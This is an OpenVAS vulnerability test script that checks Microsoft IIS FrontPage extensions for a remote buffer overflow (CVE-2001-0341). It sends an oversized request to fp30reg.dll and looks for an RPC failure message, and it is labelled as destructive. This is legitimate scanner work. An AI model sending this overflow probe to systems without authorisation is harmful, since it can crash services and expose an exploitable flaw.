###############################################################################
# OpenVAS Vulnerability Test
# $Id: frontpage_overflow.nasl 10831 2018-08-08 09:49:56Z cfischer $
#
# IIS FrontPage DoS II
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2001 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10699");
  script_version("$Revision: 10831 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-08 11:49:56 +0200 (Wed, 08 Aug 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2906);
  script_cve_id("CVE-2001-0341");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("IIS FrontPage DoS II");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2001 John Lampe");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("IIS/banner");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/MS03-051.mspx");

  script_tag(name:"solution", value:"Install either SP4 for Windows 2000 or apply the fix described
  in Microsoft Bulletin MS03-051");

  script_tag(name:"summary", value:"Microsoft IIS, running Frontpage extensions, is vulnerable to a remote
  buffer overflow attack.");

  script_tag(name:"impact", value:"An attacker, exploiting this bug, may gain access to confidential data,
  critical business processes, and elevated privileges on the attached network.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

sig = get_http_banner(port:port);
if( ! sig || "IIS" >!< sig ) exit(0);

host = http_host_name(port:port);

req = string("HEAD / HTTP/1.0\r\n", "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);
if(!res) exit(0);

url = "/_vti_bin/_vti_aut/fp30reg.dll?" + crap(260);
req = string("GET ", url, " HTTP/1.0\r\n", "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);

match = egrep(pattern:".*The remote procedure call failed*" , string:res);
if(match) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);